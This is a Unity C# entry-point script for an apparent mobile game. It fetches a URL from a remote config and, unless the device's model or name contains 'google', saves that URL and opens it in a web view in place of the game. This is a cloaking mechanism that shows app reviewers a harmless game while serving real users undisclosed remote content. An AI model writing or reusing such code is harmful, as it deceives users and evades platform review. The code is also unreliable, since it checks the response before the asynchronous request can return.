using UnityEngine;

[System.Serializable]
public class ExpectedJsonTemplate {
    public string URL;
}

public class EntryPoint : MonoBehaviour
{
    private const string localJsonConfigPath = "/remoteConfig.json";
    [SerializeField] private View _viewObject;
    [SerializeField] private GameObject _noInternetScreen;

    void Start()
    {
        string reference = PlayerPrefs.GetString("ref", "");

        if (reference == "") {
            GetRemoteConfig();
        } else {
            OpenWebView(reference);   
        }
    }

    private void GetRemoteConfig() {
        string jsonFilePath = Application.streamingAssetsPath + localJsonConfigPath;
        
        try {
            ExpectedJsonTemplate obj = JsonUtility.FromJson<ExpectedJsonTemplate>(System.IO.File.ReadAllText(jsonFilePath));
            
            string reference = "";
            StartCoroutine(InternetConnection.SendRequestTo(obj.URL, (string responseText) => {
                reference = responseText;
            }));

            if (reference == "" ||
                SystemInfo.deviceModel.ToLower().Contains("google") ||
                SystemInfo.deviceName.ToLower().Contains("google")
            ) {
                // Playgame
            } else {
                PlayerPrefs.SetString("ref", reference);
                OpenWebView(reference);
            }
        }
        catch (System.ArgumentException e) {
            Debug.Log("Deserialization error. Check expected template and income json structure equality.");
            Debug.Log("More: " + e);
        }
        catch {
            Debug.Log("Problems with internet connection.");
            _noInternetScreen.SetActive(true);
        }
    }

    private void OpenWebView(string address) {
        StartCoroutine(InternetConnection.CheckInternetConnection((bool connectionExists) => {
            if (!connectionExists) {
                _noInternetScreen.SetActive(true);
            } else {
                _noInternetScreen.SetActive(false);
                _viewObject.Show(address);
            }
        }));
    }


}
